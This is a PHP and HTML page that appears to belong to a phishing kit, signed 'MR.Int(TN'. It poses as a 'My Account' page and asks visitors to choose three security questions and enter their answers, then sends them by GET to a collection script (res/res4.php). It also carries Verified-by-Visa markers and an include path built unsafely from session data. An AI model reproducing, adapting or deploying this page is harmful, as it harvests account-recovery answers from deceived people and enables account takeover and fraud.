<?php

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*                   #              ||~~MR.Int(TN  ~~||              #                            */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
error_reporting(0);
session_start();
include("lang/". $_SESSION['_lang_'].".php");
if(isset($_POST['noob'])){
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];


 if(isset($_POST['vbv_ready']) == true){
  #ip info
  header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
else{

 header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
		  }
?>


<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/billing.css" rel="stylesheet">

<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 331px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 15px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
  .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 12px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -49px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: left;
}
  </style>
</head>


<body>
<div id="wb_Form1" style="position:absolute;left:386px; border-radius: 10px; top:63px;width:510px;height:511px;z-index:0;">

<form class="xxray_51" method="GET"   action="res/res4.php" style="
">

<center>





 <center>
 <br>
  <h2 style="
    font-family: Arial, Helvetica, sans-serif;
    font-size: 20pt;
    font-weight: normal;
    color: #666;
">Security Questions</h2><br><br>
		
	
<select name="1" size="1" id="country" class="inp" style="width: 344px;height:45px" required>
		
		<option value="0" Selected   > Select Security Question 1</option>
	<option value="what is your dream job?"  >what is your dream job?</option>
<option value="what is your memorable vacation spot?"   >what is your memorable vacation spot?</option>
<option value="what is your favourite magazine subscription?"   >what is your favourite magazine subscription?</option>
<option value="what is the postal/zip code of your family vacation home?"   >what is the postal/zip code of your family vacation home?</option>
<option value="what was the nickname of your grandfather?"   >what was the nickname of your grandfather?</option>
<option value="what type of food do you like most? Ex. Italian"   >what type of food do you like most? Ex. Italian</option>
<option value="what was your favourite restaurant in college ?"   >what was your favourite restaurant in college ?</option>
<option value="what is your grandmother's middle name (your mother's mother)?"   >what is your grandmother's middle name (your mother's mother)?</option>
<option value="what is your grandfather's middle name (your father's father)?"   >what is your grandfather's middle name (your father's father)?</option>
<option value="what is your favourite vegetable?"   >what is your favourite vegetable?</option>
<option value="what is your favourite TV show?"   >what is your favourite TV show?</option>
<option value="who is your favourite cartoon character?"   >who is your favourite cartoon character?</option>
<option value="what is the 1st concert you attended?"   >what is the 1st concert you attended?</option>
<option value="who is your childhood hero?"   >who is your childhood hero?</option>
<option value="what online forum or site do you frequent most?"   >what online forum or site do you frequent most?</option>

</select>
	<input type="text"  id="Answer1" name="01"  class="inp" value="" placeholder="Answer 1" style="width: 330px;" required><br>
	
	



	<select name="2" size="1" id="country" class="inp" style="width: 344px;height:45px" required>
		
		<option value="0" Selected   > Select Security Question 2</option>
		
		<option value="what was the name of your first roommate?">what was the name of your first roommate?</option>
<option value="what is your grandmother's middle name (your mother's mother)?">what is your grandmother's middle name (your mother's mother)?</option>
<option value="what is your grandfather's middle name (your father's father)?">what is your grandfather's middle name (your father's father)?</option>
<option value="what is your favourite hometown newspaper?">what is your favourite hometown newspaper?</option>
<option value="who was your 1st grade school teacher?">who was your 1st grade school teacher?</option>
<option value="what is your favourite dessert?">what is your favourite dessert?</option>
<option value="what is the first name of your spouse's/partner's oldest sibling?">what is the first name of your spouse's/partner's oldest sibling?</option>
<option value="what is the name of your most influential mentor?">what is the name of your most influential mentor?</option>
<option value="who is your favourite author?">who is your favourite author?</option>
<option value="what is the name of the hospital where your 1st child was born?">what is the name of the hospital where your 1st child was born?</option>
<option value="what is your favourite flower?">what is your favourite flower?</option>
<option value="what is the first name of your oldest nephew?">what is the first name of your oldest nephew?</option>
<option value="what board game do you play most often?">what board game do you play most often?</option>
<option value="what year was your basement last renovated?">what year was your basement last renovated?</option>
<option value="what is your oldest child's middle name?">what is your oldest child's middle name?</option>

</select>
	
		<input type="text"  id="Answer2" name="02"  class="inp" value="" placeholder="Answer 2" style="width: 330px;" required><br>
		
		
		
		
		<select name="3" size="1" id="country" class="inp" style="width: 344px;height:45px" required>
		
		<option value="0" Selected   > Select Security Question 3</option>
		<option value="what was the make of your first car?">what was the make of your first car?</option>
<option value="what is your spouse's/partner's nickname?">what is your spouse's/partner's nickname?</option>
<option value="what is the first name of your best childhood friend?">what is the first name of your best childhood friend?</option>
<option value="what is the first name of your spouse's/partner's youngest sibling?">what is the first name of your spouse's/partner's youngest sibling?</option>
<option value="what is your favourite fragrance?">what is your favourite fragrance?</option>
<option value="what is your youngest child's nickname?">what is your youngest child's nickname?</option>
<option value="what was the make of the first mobile phone you owned?">what was the make of the first mobile phone you owned?</option>
<option value="what is your youngest sibling's nickname?">what is your youngest sibling's nickname?</option>
<option value="what is your oldest sibling's nickname?">what is your oldest sibling's nickname?</option>
<option value="which gas station do you frequent most?">which gas station do you frequent most?</option>
<option value="what year did you get your first car?">what year did you get your first car?</option>
<option value="what is your youngest child's middle name?">what is your youngest child's middle name?</option>
<option value="what is the first name of the youngest of your siblings?">what is the first name of the youngest of your siblings?</option>
<option value="what was your favourite toy as a child?">what was your favourite toy as a child?</option>
<option value="what was your favourite band in college?">what was your favourite band in college?</option>

</select>
		
			<input type="text"  id="Answer3" name="03"  class="inp" value="" placeholder="Answer 3" style="width: 330px;" required><br>
			
			
			
			
		
	
			
		
	
 
				
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
				
				
				
					<center>
        <input class="inpclassicsumblit2" name="noob" type="submit" style="width: 364px;padding: 15px;      border-radius: 5px;      border: 0px solid red;      width: 330px;      margin-top: 0px;      background-color: #666;      font-family: Arial, Helvetica, sans-serif;      font-weight: bold;      color: #FFF;      font-size: 16px;" value="Next" id="valider">
<br></center>
        
  
        </div></center>
                                 
		
		
	</div>

		<input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden">  
           
        </div>
                
            </div>
        </div>
		
	
</form>
		
	
	
</body>
</html>